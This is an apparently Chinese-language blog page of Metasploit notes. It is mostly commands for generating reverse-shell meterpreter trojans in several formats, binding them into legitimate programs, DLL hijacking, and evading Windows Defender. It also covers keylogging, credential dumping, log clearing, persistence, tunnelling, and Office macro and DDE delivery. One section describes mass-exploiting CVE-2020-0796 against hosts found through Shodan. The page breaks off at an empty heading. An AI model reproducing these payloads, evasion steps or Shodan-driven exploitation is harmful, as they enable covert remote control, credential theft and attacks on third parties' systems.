@@ -1,0 +1,997 @@
+<!-- 博文的布局-Layout -->
+<!DOCTYPE html>
+<html>
+<head>
+<!-- 引入head标签 -->
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, minimum-scale=1.0, maximum-scale=1.0, user-sclable=0">
+<meta http-equiv="X-UA-Compatible" content="ie=edge">
+<meta name="description" content="Cyber Security" />
+<meta name="keywords" content="blockchain security,web security,system security..." />
+<link rel="stylesheet" href="/assets/css/style.css">
+<link rel="stylesheet" href="/assets/css/media.css">
+<link rel="stylesheet" href="/assets/css/animate.min.css">
+<link rel="stylesheet" href="/assets/css/pygments/pygments_default.css">
+<link rel="stylesheet" href="/assets/css/github-markdown.css">
+<!-- SNS-icon -->
+<script src="//at.alicdn.com/t/font_856428_y9z6nq7zf5.js"></script>
+<!-- share.css -->
+<link rel="stylesheet" href="/assets/css/share.min.css">
+<!-- font -->
+<link rel="stylesheet" href="/assets/css/font.css">
+<!-- <link href="https://fonts.googleapis.com/css?family=Kaushan+Script|Pacifico|Ubuntu|Roboto+Mono|Source+Sans+Pro" rel="stylesheet"> -->
+
+<!-- Favicon -->
+<link href="/assets/profile.jpeg" rel="shortcut icon" />
+<link href="/assets/profile.jpeg" rel="apple-touch-icon-precomposed" />
+<!-- Android Lolipop Theme Color -->
+<!-- <meta name="theme-color" content="#1464FB"> -->
+<title>Metasploit</title>
+<!-- 百度统计 -->
+
+<script>
+var _hmt = _hmt || [];
+(function() {
+  var hm = document.createElement("script");
+  hm.src = "https://hm.baidu.com/hm.js?";
+  var s = document.getElementsByTagName("script")[0];
+  s.parentNode.insertBefore(hm, s);
+})();
+</script>
+
+<!-- 谷歌分析 -->
+
+
+<!-- Android Lolipop Theme Color -->
+<meta name="theme-color" content=" rgb(252,168,3) ">
+</head>
+<body>
+
+<!-- 顶部锚点 -->
+<a id="htmlup" name="htmlup"></a>
+<!-- 引入博文顶部选项 -->
+
+<header id="post-header" style="background-color:rgb(252,168,3);">
+  <div class="top-center">
+      <div class="logo">
+          <a href="/" title="my awesome webtitle" style="color: white;">Wake up neo</a>
+      </div>
+      <nav class="top-nav">
+          <ul>
+              
+                <li><a href="/" style="color: white;">首页</a></li>
+              
+                <li><a href="/tags.html" style="color: white;">标签</a></li>
+              
+                <li><a href="/timeline.html" style="color: white;">时间线</a></li>
+              
+                <li><a href="/about.html" style="color: white;">关于博主</a></li>
+              
+                <li><a href="/friendLink.html" style="color: white;">友情链接</a></li>
+              
+          </ul>
+      </nav>
+      <div id="top-boot">
+        <a href="javascript:;" id="boot1" style="display:block;" onclick="document.getElementById('boot-area').style.display='block';document.getElementById('boot1').style.display='none';document.getElementById('boot2').style.display='block';"><img src="/assets/boot_white.png" alt=""></a>
+        <a href="javascript:;" id="boot2" style="display: none;" onclick="document.getElementById('boot-area').style.display='none';document.getElementById('boot1').style.display='block';document.getElementById('boot2').style.display='none';"><img src="/assets/boot_white.png" alt=""></a>
+      </div>
+  </div>
+
+</header>
+
+
+<!-- 引入移动下拉选项 -->
+<div id="boot-area">
+    <ul>
+        
+          <a href="/"><li>首页</li></a>
+        
+          <a href="/tags.html"><li>标签</li></a>
+        
+          <a href="/timeline.html"><li>时间线</li></a>
+        
+          <a href="/about.html"><li>关于博主</li></a>
+        
+          <a href="/friendLink.html"><li>友情链接</li></a>
+        
+    </ul>
+</div>
+
+<!-- 引入博文顶部样式 -->
+<!-- 版本一 垃圾 -->
+<!-- <div class="wow fadeIn top" data-wow-duration="3.5s" >
+    <span class="wow fadeInUp" data-wow-delay="0.2s">Metasploit</span>
+    <span class="wow fadeInUp" data-wow-delay="0.4s"></span>
+    <span class="wow fadeInUp" data-wow-delay="0.4s"></span>
+    <span class="wow fadeInUp" data-wow-delay="0.6s">作者&nbsp;&nbsp;|&nbsp;&nbsp;true</span>
+</div> -->
+
+<!-- 版本二 可切换页面 -->
+
+<div class="post-top" style="background-color:rgb(252,168,3);">
+  <!-- 页面宽度大于800px -->
+  <div class="left-area">
+    
+      <a href="/2021/12/13/Information-Gathering.html" class="btn bounceInLeft animated" onmouseover="showLeft();this.style.color='rgb(252,168,3)';" onmouseout="goneLeft();this.style.color='rgba(0,0,0,.2)';"><</a>
+      <div id="left-tab" style="display:none;"><span class="left-san"></span><span class="left-main" style="color:rgb(252,168,3);"><sapn class="main">information-Gathering</sapn></span></div>
+    
+  </div>
+  <div class="post-titlearea">
+    <span class="wow fadeInUp" data-wow-delay="0.2s">Metasploit</span>
+    <!-- <span class="wow fadeInUp" data-wow-delay="0.4s"></span> -->
+    <!-- <span class="wow fadeInUp" data-wow-delay="0.4s"></span> -->
+    <!-- <span class="wow fadeInUp" data-wow-delay="0.6s">作者&nbsp;&nbsp;|&nbsp;&nbsp;true</span> -->
+  </div>
+  <div class="right-area">
+    
+      <a href="/2021/06/04/ret2textROP.html" class="btn bounceInRight self-animated" onmouseover="showRight();this.style.color='rgb(252,168,3)';" onmouseout="goneRight();this.style.color='rgba(0,0,0,.2)';">></a>
+      <div id="right-tab" style="display:none;"><span class="right-san"></span><span class="right-main" style="color:rgb(252,168,3);"><sapn class="main">ret2text ROP</sapn></span></div>
+    
+  </div>
+
+  <!-- 页面宽度小于800px -->
+  <div class="post-changearea">
+    
+      <a href="/2021/12/13/Information-Gathering.html" class="leftchange" style="border-right: 1px solid rgb(252,168,3);border-bottom: 2px solid rgb(252,168,3);"><span>上一篇<br><br>information-Gathering</span></a>
+    
+    
+      <a href="/2021/06/04/ret2textROP.html" class="rightchange" style="border-left: 1px solid rgb(252,168,3);border-bottom: 2px solid rgb(252,168,3);"><span>下一篇<br><br>ret2text ROP</span></a>
+    
+  </div>
+</div>
+
+
+<div class="markdown-body fadeInUp animated">
+
+  
+    
+      <div class="postpage-subtitle" style="border-left: 8px solid rgb(252,168,3); border-right: 8px solid rgb(252,168,3)">
+        Metasploit by yako33!
+      </div>
+    
+  
+
+  <!-- 文章内容 -->
+  <p>[TOC]</p>
+
+<h4 id="msf更新">msf更新</h4>
+<p>apt update,apt install metasploit-framework</p>
+
+<h4 id="木马配置基础">木马配置基础</h4>
+
+<p>?/help 查看帮助</p>
+
+<h4 id="functions">Functions</h4>
+
+<p>自启动</p>
+
+<p>键盘记录</p>
+
+<p>进程管理</p>
+
+<p>注册表管理</p>
+
+<p>计划任务管理</p>
+
+<p>文件管理</p>
+
+<p>commandline等等</p>
+
+<p>兼容性（C/C++）</p>
+
+<h4 id="android配置">android配置</h4>
+
+<p>Vicitms工具可以简单配置，通过模拟器复现apk上线操作</p>
+
+<h3 id="msf配置">MSF配置</h3>
+
+<h4 id="配置监听和生成">配置监听和生成</h4>
+
+<p>msfconsole use exploit/multi/handler TCP反弹shell监听方式</p>
+
+<p>show options进行配置</p>
+
+<p>show payload查看木马选项</p>
+
+<p>木马生成msfvenom -h查看帮助选项</p>
+
+<p>msfvenom -l formats查看可输出格式</p>
+
+<p>msfvenom -l archs查看可输出架构模式</p>
+
+<p>msfvenom -l platforms查看可输出平台模式</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>msfvenom -p windows/meterperter/reverse_tcp -f exe -a x86 --platforms windows -o ../../test.exe LHOST=192.ip.ip.ip LPORT=4444
+</code></pre></div></div>
+
+<p>meterpreter help查看可使用命令</p>
+
+<h4 id="生成vbs">生成VBS</h4>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>msfvenom -p windows/meterperter/reverse_tcp -f vbs -a x86 --platform windows -o ../../test.exe LHOST=192.ip.ip.ip LPORT=4444
+</code></pre></div></div>
+
+<h4 id="写文件">写文件</h4>
+
+<p>写shell，以x86为例</p>
+
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">ip</span><span class="o">=</span>192.168.113.113
+<span class="nv">port</span><span class="o">=</span>4444
+<span class="nb">arch</span><span class="o">=</span>x86
+<span class="nv">platform</span><span class="o">=</span>windows
+<span class="nv">format</span><span class="o">=</span>vbs
+<span class="nv">payload</span><span class="o">=</span>windows/meterpreter/reverse_tcp
+
+out <span class="o">=</span> ~/exploit/meter_rev_tcp_x86.vbs
+msfvenom <span class="nt">-p</span> <span class="nv">$payload</span> <span class="nv">LHOST</span><span class="o">=</span><span class="nv">$ip</span> <span class="nv">LPORT</span><span class="o">=</span><span class="nv">$port</span> <span class="nt">-f</span> <span class="nv">$format</span> <span class="nt">-a</span> <span class="nv">$arch</span> <span class="nt">--platform</span> <span class="nv">$platform</span> <span class="nt">-o</span> <span class="nv">$out</span>
+</code></pre></div></div>
+
+<h4 id="读文件">读文件</h4>
+
+<p>读rc</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>use exploit/multi/handler
+set payload windows/meterpreter/reverse_tcp
+set LHOST ip.ip.ip.ip
+set LPORT 4444
+run
+</code></pre></div></div>
+
+<p>msfconsole -r file</p>
+
+<h3 id="木马捆绑">木马捆绑</h3>
+
+<p>-x 捆绑exe</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ip=192.168.113.113
+port=4444
+arch=x86
+platform=windows
+format=exe
+payload=windows/meterpreter/reverse_tcp
+x=/home/kali/test/test.exe
+
+out = ~/exploit/meter_rev_tcp_x86.exe
+msfvenom -p $payload LHOST=$ip LPORT=$port -f $format -a $arch --platform $platform -o $out -x $x
+</code></pre></div></div>
+
+<h3 id="dll">DLL</h3>
+
+<p>生成dll</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ip=192.168.113.113
+port=4444
+arch=x86
+platform=windows
+format=dll
+payload=windows/meterpreter/reverse_tcp
+
+out = ~/exploit/meter_rev_tcp_x86.dll
+msfvenom -p $payload LHOST=$ip LPORT=$port -f $format -a $arch --platform $platform -o $out
+</code></pre></div></div>
+
+<p>使用IDA打开后，在export导出表中可以查看entrypoint</p>
+
+<p>view-A中可以找到DLLentrypoint函数</p>
+
+<h4 id="dll利用">DLL利用</h4>
+
+<p>cmd/powershell</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>rundll32 C:/file.dll dll.DLLentrypoint
+</code></pre></div></div>
+
+<p>bat/加载器</p>
+
+<p>dll更名为其他进程同名dll加载  /   用c++合并dll   /  dll劫持</p>
+
+<h3 id="dll劫持">DLL劫持</h3>
+
+<p>以计算器calc.exe为例，假设存在div.dll被动态调用，函数被call</p>
+
+<p>如果calc.exe call  div(evil).dll （同名覆盖）在evil.dll去调用div.dll</p>
+
+<p>可以使用C++编写/ Aheadlib工具</p>
+
+<p>拷贝Aheadlib代码到vs，找到DLLmain中执行加载</p>
+
+<p>loadlibraryA(“back.dll”),编译需要属性设置C++代码生成运行库设置 多线程MT</p>
+
+<p>dll劫持：
+a.exe 调用 b.dll 有一个 func（）</p>
+
+<p>b.dll 改名bb.dll(或者直接根据路径劫持)</p>
+
+<p>写一个b.dll 有一个 func-x() 在func(加载bb.dll) -&gt;bb.dll调用func()</p>
+
+<p>运行windows加载dll 主程序目录查找b.dll/系统路径下/环境变量路径
+key:b.dll里的函数名称和函数参数
+1：直接重新编译源码替换文件
+2：反编译</p>
+
+<p>调试：查看有没有某个dll缺失之后exe无法运行，则为劫持目标</p>
+
+<p>VS：创建DLL MFC DLL-&gt;共享 
+入口定义，工程属性Release MFC的使用改为静态</p>
+
+<p>劫持ws2_32.dll可以实现抓包，改包，转向等
+伪造导出表ep:</p>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>#pragma comment(linker, "/EXPORT:LpkInitialize=_gamehacker_LpkInitialize,@1")
+</code></pre></div></div>
+
+<p>dll导出表和劫持源码生成工具 load（）函数一般为工具生成的原本的dll，其上为注入函数</p>
+
+<p>注入最好是在保护机制开启之前被调用的dll</p>
+
+<h3 id="hta">HTA</h3>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>platform=hta-psh
+</code></pre></div></div>
+
+<p>基于HTML，木马中包含vbsscript,执行windows窗口不可见，创建了wscript.shell对象，执行powershell，小众木马</p>
+
+<h3 id="编码混淆">编码混淆</h3>
+
+<p>encoder/IDA分析</p>
+
+<p>msfvenom -l encoder 查看编码混淆</p>
+
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">encoder</span><span class="o">=</span>x86/shikata_ga_nai
+<span class="nv">i</span><span class="o">=</span>10
+msfvenom <span class="nt">-e</span> <span class="nv">$encoder</span> <span class="nt">-i</span> <span class="nv">$i</span>
+</code></pre></div></div>
+
+<h3 id="keep">keep</h3>
+
+<p>捆绑exe时新开线程启动</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>msfvenom -p $payload LHOST=$ip LPORT=$port -f $format -a $arch --platform $platform -o $out -x $x -k
+</code></pre></div></div>
+
+<p>ep:</p>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>msfvenom -p windows/meterpreter/reverse_tcp -f exe -a x86 --platform windows -o /home/yako/back.exe LHOST=192.168.113.133 LPORT=4444 -x /home/yako/桌面/hfs2.3.exe -k
+</code></pre></div></div>
+
+<h4 id="文件操作">文件操作</h4>
+
+<p>meterpreter
+ls/cat/edit flie 查看/编辑文件(可以使用命令dir，windows只有Dir但是应该具有ls转换)
+cat exp.ini
+edit exp.ini
+getwd 远程方法获取当前路径
+getlwd
+pwd
+mkdir filename创建文件夹
+rmdir
+cp文件</p>
+
+<p>windows,shell中</p>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>attrib -h -s *
+</code></pre></div></div>
+
+<p>mv/lls/search</p>
+
+<p>移动文件/查看写入执行等属性/查找文件</p>
+
+<p>show_mount查看驱动器</p>
+
+<p>download filename(windows本地) 传输文件到本地
+upload</p>
+
+<p>checksum md5(也可以查看其他)查看md5文件指纹</p>
+
+<h4 id="系统命令">系统命令</h4>
+
+<p>ps #列出所有进程</p>
+
+<p>getsysytem -h #提权
+getsystem -t 0 #所有可以提权的方式</p>
+
+<p>rev2self #回到初始权限</p>
+
+<p>clearev #清除权限，清除日志</p>
+
+<p>drop_token #从进程窃取</p>
+
+<p>execute -h#执行命令
+ep: execute -f notepad
+隐藏执行/从内存执行</p>
+
+<p>getenv #获取环境变量
+getpid #获取进程id，通过这个来获取tid线程id,ppid父进程</p>
+
+<p>getprivs #根据windows编程当中的函数获取权限
+ep: debug</p>
+
+<p>getsid #windows账户机制
+getuid #当前账户</p>
+
+<p>kill pid #杀进程
+localtime #显示时间</p>
+
+<p>pgrep -h #筛选进程
+ep: pgrep notepad（像find）</p>
+
+<p>pkill #通过名称杀进程
+pkill notepad</p>
+
+<p>reg #写注册表</p>
+
+<p>run post/windows/gather/hashdump(getsystem)然后通过hash爆破</p>
+
+<p>reboot
+shutdown
+sysinfo
+suspend -h #进程挂起
+ep: suspend notepad
+suspend -r #恢复</p>
+
+<p>shell #中文编码修改
+shell中set查看环境变量</p>
+
+<h4 id="网络操作">网络操作</h4>
+
+<p>arp #查看arp表
+getproxy #查看代理
+ipconfig
+netstat
+route -h#查看路由表
+resolve #解析域名
+portfwd -h #端口转发
+ep: port add -l 6666 -p 3389 -r 被控机ip （delete）</p>
+
+<p>portfwd list查看</p>
+
+<h4 id="其他操作">其他操作</h4>
+
+<p>enumdesktops #枚举桌面
+setdesktop -h #设置桌面
+getdesktop 
+keyborad_send
+keyevent -h #设置按下抬起 keycode(13 回车)press
+keyscan_dump
+keyscan_start
+keyscan_stop
+mouse doubleclick 双击
+mose move</p>
+
+<p>screenshare
+screenshot
+uictl #控制接口单元
+ep: uictl disable/enable keyboard/all</p>
+
+<p>timestomp back.exe -v #修改时间戳</p>
+
+<p>webcanm
+play #播放鬼音乐</p>
+
+<h4 id="多木马控制">多木马控制</h4>
+
+<p>background/bg
+session
+set exitonsession false #支持多个木马连接</p>
+
+<p>run/exploit -h
+run -j  #后台静默
+jobs #查看后台</p>
+
+<p>session -i 1 #选中</p>
+
+<p>jobs -h
+jobs -k #关闭</p>
+
+<h4 id="持久化">持久化</h4>
+
+<p>show advanced #查看高级选项设置</p>
+
+<p>run tab #查看可执行脚本
+run persistence -h #可持久化操作
+-x 自启动
+-i 心跳设置
+-p 连接端口
+-r 需要连接的ip
+msf会创建一个脚本进行执行，添加注册表</p>
+
+<p>shell设置/dll加载注入/自启动进程劫持</p>
+
+<p>ep:</p>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>meterpreter&gt;run persistence -X -i 3 -p 4444 -r ip
+</code></pre></div></div>
+
+<h4 id="进程迁移">进程迁移</h4>
+
+<p>木马进程转移
+core命令集中使用migrate
+migrate -h 
+-P pid -N name -t timeout</p>
+
+<h4 id="msf漏洞扫描">MSF漏洞扫描</h4>
+
+<p>msf6&gt;back#回退
+/usr/share/msf中修改代码</p>
+
+<p>msf6&gt;makerc /home/destop/a.rc#保存历史命令记录
+resource#读取rc</p>
+
+<p>msf6&gt;rename_job 0 aaa #更改job名称
+kill jobid#关闭job名称</p>
+
+<p>msf6&gt;search name: 0708/0708 #筛选/未筛选名称 可用漏洞
+show auxiliary #查看扫描检查
+show exploit#查看攻击
+set target#设置目标系统
+check#检查漏洞（部分攻击模块没有）（ms17-010）</p>
+
+<h4 id="msf内网穿透">MSF内网穿透</h4>
+
+<p>公网上面开启frp
+~/frp_linux_amd64 ./frps -c frps.ini
+需要配置,但是也可以使用默认配置</p>
+
+<p>客户端
+./frpc -c frpc.ini
+需要配置
+ep:</p>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>[common]
+server_addr = 公网ip
+server_port = 7000
+
+[ssh]
+type = tcp
+local_ip = 127.0.0.1
+local_port = 22
+local_port =6000
+
+[msf]
+type = tcp
+local_ip = 127.0.0.1
+local_port = 6666
+remote_port = 7002
+</code></pre></div></div>
+
+<p>msf木马设置需要设置为公网ip: port（[msf]remoteport）
+监听需要设置为本地：127.0.0.1: 转发端口[msf local_port]</p>
+
+<p>如果使用CS的话可以不用部署，如果你的CS版本中未有此功能或者失效同样可以配置Frp</p>
+
+<h4 id="stager">stager</h4>
+<p>meterpreter:
+1 single#单体木马
+2 stager/stage#windows/stage/stager
+攻击成功后先放入stager仅做连接
+剩余做的动态连接库和恶意文件发送到stage(防止dump/功能分离)</p>
+
+<p>stager=https/http/tcp/uuid
+stage=meterpeter/peinject/shell/vncinject</p>
+
+<p>reverse反向
+bind正向</p>
+
+<p>msf6&gt;show payloads
+msf6&gt;show exploits</p>
+
+<h4 id="零碎handler">零碎/handler</h4>
+<p>payload的设置大同小异，但是部分payload的设置需要SRVhost，这是指访问地址，如果chrome0day等，也有设置宏文件doc等exploit模块</p>
+
+<p>设置好后可以使用handler直接设置好监听模块</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>msf6&gt;exploit(mulit/fileformat/office_word)&gt;handler -H 192.ip.ip.ip -P 4444 -p windows/meterpreter/reverse_tcp -n(name) bilibili 
+</code></pre></div></div>
+
+<h4 id="linux木马">linux木马</h4>
+
+<p>generate -h 生成功能</p>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>msf6&gt;use payload/linux/x64/meterpreter/reverse_tcp
+
+set lhost ip
+</code></pre></div></div>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>msf6 payload(linux)&gt;generate -f elf -o ~/test
+</code></pre></div></div>
+
+<p>meterpretere中execute命令会将命令转换成win/linux/mac/ios等不同平台下的可执行命令</p>
+
+<h4 id="mac木马">mac木马</h4>
+
+<p>与win/linux平台类似，mac下它的文件格式为macho</p>
+
+<p>使用file+文件名查看文件信息，可执行信息</p>
+
+<p>不同平台中meterpreter不同平台可用命令也会有相当的差异</p>
+
+<h4 id="androidios木马">android/ios木马</h4>
+
+<p>由于msf不会直接打包android和ios，由于其可以加载elf-so所以需要加载器</p>
+
+<p>msfvenom可以生成apk</p>
+
+<h4 id="跨平台木马设置">跨平台木马设置</h4>
+
+<p>解释器语言生成木马
+python/java/php/ruby</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>set payload /ruby/shell_reverse_tcp
+
+generate -f rb -o ~/back.rb
+generate -f raw -o ~/back.rb
+
+
+generate -f python -o ~/back.py
+generate -f raw -o ~/back.py
+</code></pre></div></div>
+
+<h4 id="cve-2020-0796">cve-2020-0796</h4>
+
+<p>需要搭建靶场环境查找系统安装补丁号
+systeminfo
+KB4551762</p>
+
+<p>exploitdb找到cve-2020-0796的exploit脚本
+由于console没有变量名替换，通过msfvenom生成</p>
+
+<p>-b 取消滑块 ‘\x00\xff’
+-v 指定变量名</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>msfvenom -p windows/xx/xxx/xxxtcp lhost=ip.ip.ip.ip lport=4444 -f python -v USER_PAYLOAD -b '\x00\xff'
+</code></pre></div></div>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.113.133 LPORT=4444 -f python -v USER_PAYLOAD -b '\0x00' 
+</code></pre></div></div>
+
+<p>按指定变量名替换shellcode之后，在exploit.py当中可以结合shadon进行ip扫描攻击，获取meterpreter
+但此脚本很不稳定，常攻击失败shellcode读取不到，msf监听会断</p>
+
+<p>shodan需要使用api对接，生成扫描到的txt文件，在通过修改exploit脚本为读取ip地址文件</p>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">import</span> <span class="nn">shodan</span>
+<span class="n">SHODAN_API_KEY</span> <span class="o">=</span> <span class="s">"API_Key"</span>
+<span class="n">api</span> <span class="o">=</span> <span class="n">shodan</span><span class="p">.</span><span class="n">Shodan</span><span class="p">(</span><span class="n">SHODAN_API_KEY</span><span class="p">)</span>
+</code></pre></div></div>
+<p>搜索结果</p>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">try</span><span class="p">:</span>
+    <span class="c1">### 搜索 Shodan
+</span>    <span class="n">results</span> <span class="o">=</span> <span class="n">api</span><span class="p">.</span><span class="n">search</span><span class="p">(</span><span class="s">'apache'</span><span class="p">)</span>
+    <span class="c1">### 显示结果
+</span>    <span class="k">print</span> <span class="s">'Results found: %s'</span> <span class="o">%</span> <span class="n">results</span><span class="p">[</span><span class="s">'total'</span><span class="p">]</span>
+    <span class="k">for</span> <span class="n">result</span> <span class="ow">in</span> <span class="n">results</span><span class="p">[</span><span class="s">'matches'</span><span class="p">]:</span>
+            <span class="k">print</span> <span class="n">result</span><span class="p">[</span><span class="s">'ip_str'</span><span class="p">]</span>
+<span class="k">except</span> <span class="n">shodan</span><span class="p">.</span><span class="n">APIError</span><span class="p">,</span> <span class="n">e</span><span class="p">:</span>
+    <span class="k">print</span> <span class="s">'Error: %s'</span> <span class="o">%</span> <span class="n">e</span>
+</code></pre></div></div>
+
+<p>对开放端口的服务器做exp
+ep读文件:</p>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">ips</span> <span class="o">=</span> <span class="nb">open</span><span class="p">(</span><span class="n">args</span><span class="p">.</span><span class="n">ip</span><span class="p">)</span>
+<span class="k">for</span> <span class="n">ip</span> <span class="ow">in</span> <span class="n">ips</span><span class="p">.</span><span class="n">readlines</span><span class="p">():</span>
+	<span class="k">try</span><span class="p">:</span>
+		<span class="n">do_rce</span><span class="p">(</span><span class="n">ip</span><span class="p">.</span><span class="n">strip</span><span class="p">(),</span><span class="mi">445</span><span class="p">)</span>
+	<span class="k">except</span><span class="p">:</span>
+		<span class="k">pass</span>
+</code></pre></div></div>
+
+<h4 id="辅助模块">辅助模块</h4>
+
+<p>辅助模块auxiliary，辅助模块的使用方式和exploit很相似需要setting，他有sql注入,1day,voip等等，辅助模块具有check的意义，在1day下，他并不会攻击仅利用poc进行扫描</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>msf6&gt; use auxiliary/spoof/arp_poisoning
+&gt;show options
+&gt;set SHOSTS
+</code></pre></div></div>
+
+<p>show auxiliary</p>
+
+<p>ep收集信息:</p>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>use auxiliary/gather/browser_info
+&gt;show options
+&gt;set srvhost kaliip
+&gt;set srvport 80
+&gt;run
+
+using url: http://kaliip:80/zqsasd
+started.
+</code></pre></div></div>
+
+<p>其他浏览器打开这个连接可收集这个信息</p>
+
+<p>汇编中的滑块指令
+show nops
+ep:</p>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>use nop/x86/single_byte
+show advanced
+generate 20
+buf=
+"\x99\x4f.....\x41\x97"
+</code></pre></div></div>
+
+<h4 id="混淆模块">混淆模块</h4>
+<p>encoders具有非常多的编码形式，可以编码代码或者文件</p>
+
+<p>还有一个evasion模快比如：
+evasion/windows/windows_defender_exe</p>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>msf6&gt;show evasion
+&gt;info evasion/windows/windows_defender_exe
+</code></pre></div></div>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>msf6&gt;use evasion/windows/windows_defender_exe
+&gt;show options
+### 这里不设置会默认使用x86meterpreter
+&gt;run
+#生成
+</code></pre></div></div>
+<p>生成后在导出表中将无法在看到部分函数，真正的代码解密后加载进入内存执行</p>
+
+<h4 id="post">POST</h4>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>msf6&gt;show post
+</code></pre></div></div>
+<p>handler中使用stage，具有sessions下可以使用</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>#info查看信息，此处post为收集tomcat信息
+msf6&gt;info post/windows/gather/enum_tomcat
+
+#使用
+meterpreter&gt;run post/windows/gather/enum_tomcat
+</code></pre></div></div>
+
+<p>post模块可以发送，注入，收集电脑的信息，比如chrome收集，也会自动去搜索存在的cookie,开启远程桌面等等</p>
+
+<p>部分模块需要提权才可以使用
+ep:
+post/windows/gather/enum_patches
+查看补丁模块</p>
+
+<h4 id="插件">插件</h4>
+
+<p>load加载插件,-l查看可以加载的插件</p>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>load -l
+</code></pre></div></div>
+<p>token_hunter,sqlmap,thread,wiki等等
+ep:
+load sqlmap
+unload sqlmap
+ep:
+load nessus
+等等</p>
+
+<h4 id="getset">get/set</h4>
+
+<p>set/setg
+get/getg
+设置变量/全局变量
+ep:
+msf6&gt;setg LHOST 192.168.1.1
+msf6&gt;getg LHOST
+下次use exploit就会设置好</p>
+
+<h4 id="msf数据库">MSF数据库</h4>
+<p>开启数据库服务
+systemctl start postgresql 
+数据库初始化
+msf6&gt;msfdb init
+查看状态
+msf6&gt;db_status
+查看hosts
+msf6&gt;hosts
+查看服务
+msf6&gt;service
+查看其他信息记录
+msf6&gt;notes
+查看执行信息
+msf6&gt;loot
+查看漏洞
+msf6&gt;vulns</p>
+
+<p>workspace功能，建立工作区，对数据分类
+查看帮助
+workspace -h
+查看当前workspace信息
+workspace -v
+切换到默认
+workspace default
+添加
+workspace -a yako</p>
+
+<p>kali中使用下面数据库工具查看
+dbeaver community
+设置连接</p>
+
+<p>db_export/db_import导入导出</p>
+
+<h4 id="代码结构">代码结构</h4>
+<p>MSF框架代码结构与模块生成</p>
+
+<h4 id="使用结构">使用结构</h4>
+
+<p>高级检查和虚拟机检测</p>
+
+<p>https设置与tcp设置</p>
+
+<h4 id="宏">宏</h4>
+
+<p>仅可以针对开启了宏的计算机具有范围缺陷性</p>
+
+<p>配置：选项-需要配置信任中心-启用所有宏、自定义功能区-开发工具</p>
+
+<p>vba/vba-exe
+msf宏主要生成宏语法，将语言进行加解密内存执行，调用kernel32动态链接库等等，生成stager</p>
+
+<p>需要单步调式宏文件，shellcode已经由msf生成好了，但是变量值的获取方式需要手动修改（vba-exe）</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>msf6&gt;search macro
+</code></pre></div></div>
+<p>msf中也可以生成宏文件</p>
+
+<h4 id="vnc">VNC</h4>
+
+<p>VNC类似3389由工具生成服务端和客户端，常有未授权VNC可以利用（不太支持高版本）</p>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>msf6&gt;search type:exploit vnc
+</code></pre></div></div>
+
+<p>设置键盘执行，使用vba cmdstager</p>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>msf6&gt;use exploit/multi/vnc/vnc_keyboard_exec
+msf6&gt;set target 1
+</code></pre></div></div>
+<p>执行exploit（使用键盘输入）</p>
+
+<p>VNC爆破可以尝试使用auxiliary/scanner/vnc/vnc_login</p>
+
+<h4 id="dde">DDE</h4>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>msf6&gt;use exploit/windows/fileformat/office_dde_delivery
+msf6&gt;set srvhost (设置kali服务端)
+msf6&gt;set srvpost (设置kali服务端端口)
+</code></pre></div></div>
+<p>设置好靶机ip生成msf.rtf
+利用安全设置提示攻击（隐藏回车位置右键更新域查看域代码）
+ddeauto C:路径…exe</p>
+
+<p>msf6&gt;search fileformat查看文件格式 dde只是其中一种</p>
+
+<h4 id="隐蔽执行">隐蔽执行</h4>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>meterpreter&gt;execute -h
+meterpreter&gt;execute -f notepad -a test.txt
+meterpreter&gt;execute -f notepad -a test.txt -H
+</code></pre></div></div>
+<p>-H hidden创建隐藏进程</p>
+
+<p>备份到kali一个cmd.exe文件</p>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>meterpreter&gt;execute -f /home/cmd.exe -m(指定内存运行) -d notepad
+</code></pre></div></div>
+<p>-i交互cmd</p>
+
+<p>32位需要对应32位，64位需要对应64位</p>
+
+<h4 id="流量劫持">流量劫持</h4>
+
